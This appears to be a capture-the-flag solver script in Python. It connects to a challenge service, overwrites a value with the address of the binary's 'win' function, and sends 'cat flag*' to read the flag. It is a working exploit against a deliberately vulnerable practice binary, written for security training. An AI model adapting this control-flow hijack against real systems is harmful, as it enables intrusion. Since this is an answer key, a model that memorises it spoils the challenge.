from ptrlib import *
import os

HOST = os.getenv('HOST', '0.0.0.0')
PORT = os.getenv('PORT', '9001')

elf = ELF("../distfiles/chall")

for j in range(3):
    sock = Socket(HOST, int(PORT))

    for i in range(4):
        sock.sendlineafter("= ", str(0xdead))
    sock.sendlineafter("= ", str(elf.symbol('win')))
    sock.sendlineafter(": ", str(-1))

    sock.sendline("cat flag*")
    print(sock.recvline())

    sock.close()
